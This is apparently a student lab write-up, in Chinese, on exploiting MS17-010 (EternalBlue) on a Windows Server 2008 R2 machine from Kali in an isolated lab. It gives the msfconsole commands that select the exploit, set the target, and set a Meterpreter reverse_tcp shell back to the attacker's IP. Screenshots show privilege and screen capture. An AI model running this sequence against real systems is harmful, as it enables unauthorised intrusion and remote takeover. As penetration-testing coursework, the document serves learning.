# Metasploit

## 实验环境

Win2008R2   IP:192.168.10.130

![image-20231101191811173](D:\作业\Linux\Metasploit\img\1.png)

Kali  IP:192.168.10.128

![image-20231101185646691](D:\作业\Linux\Metasploit\img\2.png)

## 实验步骤

#### 启用Metasploit

启动postgresql服务

![image-20231101175018636](D:\作业\Linux\Metasploit\img\3.png)

搜索ms17_010找到辅助模块

![image-20231101175617900](D:\作业\Linux\Metasploit\img\5.png)

![image-20231101175754858](D:\作业\Linux\Metasploit\img\6.png)

![image-20231101192004728](D:\作业\Linux\Metasploit\img\7.png)

渗透扫描windows的samba服务

```basic
msf6 auxiliary(scanner/smb/smb_ms17_010) > use exploit/windows/smb/ms17_010_eternalblue
```

设置被渗透IP

```basic
msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 192.168.10.130
rhosts => 192.168.10.130（Win2008R2 IP）
```

设置payload

```basic
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
```

设置本机的IP

```basic
msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost 192.168.10.128
lhost => 192.168.10.128  （Kali的IP地址）
```

![image-20231101192851510](D:\作业\Linux\Metasploit\img\8.png)

![image-20231101192930283](D:\作业\Linux\Metasploit\img\9.png)

查看获取的权限

![image-20231101193045703](D:\作业\Linux\Metasploit\img\10.png)

截图被渗透主机的屏幕

![image-20231101193155047](D:\作业\Linux\Metasploit\img\11.png)

在文件夹中找到此图片打开

![image-20231101193535426](C:\Users\tjw26\AppData\Roaming\Typora\typora-user-images\image-20231101193535426.png)